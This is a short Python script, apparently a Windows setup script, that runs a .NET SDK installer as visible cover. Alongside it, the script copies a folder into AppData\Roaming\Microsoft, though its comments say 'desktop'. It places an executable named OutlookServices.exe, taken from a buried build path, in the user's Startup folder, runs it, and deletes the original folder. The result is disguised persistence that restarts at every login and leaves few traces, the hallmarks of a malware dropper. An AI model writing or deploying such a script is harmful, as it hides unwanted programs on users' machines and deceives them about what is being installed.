import os
import shutil
import subprocess
import getpass

def copy_folder_to_desktop(source_folder, destination_folder):
    try:
        shutil.copytree(source_folder, destination_folder)
        print(f"Contents of folder '{os.path.basename(source_folder)}' copied to desktop.")

    except Exception as e:
        print("Error:", e)

def copy_exe_to_startup_and_run(source_exe):
    try:
        username = getpass.getuser()
        startup_folder = os.path.join("C:\\Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        exe_name = os.path.basename(source_exe)
        destination_path = os.path.join(startup_folder, exe_name)

        shutil.copy(source_exe, destination_path)
        print(f"Executable '{exe_name}' copied to startup folder.")

        subprocess.Popen([destination_path])
        print(f"Running '{exe_name}' from startup.")

    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    current_directory = os.path.dirname(__file__)
    print("Current Directory:", current_directory)

    folder_to_copy = "Libraries"  # Specify the name of the folder to copy
    source_folder = os.path.join(current_directory, folder_to_copy)

    installer_to_run = "dotnet-sdk-7.0.400-win-x64.exe"  # Specify the name of the installer
    source_exe_path = os.path.join(current_directory,  "Libraries", "bin", "Debug", "net6.0-windows", "obj", "Debug", "net6.0-windows", "OutlookServices.exe") # Specify the path of the source executable

    desktop_path = os.path.join("C:\\Users", getpass.getuser(), "AppData", "Roaming", "Microsoft")
    destination_folder = os.path.join(desktop_path, folder_to_copy)

    installer_path = os.path.join(current_directory, installer_to_run)
    print("Installer Path:", installer_path)

    try:
        # Copy folder to desktop
        copy_folder_to_desktop(source_folder, destination_folder)

        # Run installer
        subprocess.Popen([installer_path])
        print(f"Running '{installer_to_run}'.")

        # Copy executable to startup and run
        copy_exe_to_startup_and_run(source_exe_path)

        # Delete the 'Libraries' folder from the current directory
        shutil.rmtree(source_folder)
        print(f"Deleted '{folder_to_copy}' from current directory.")

    except Exception as e:
        print("Error:", e)
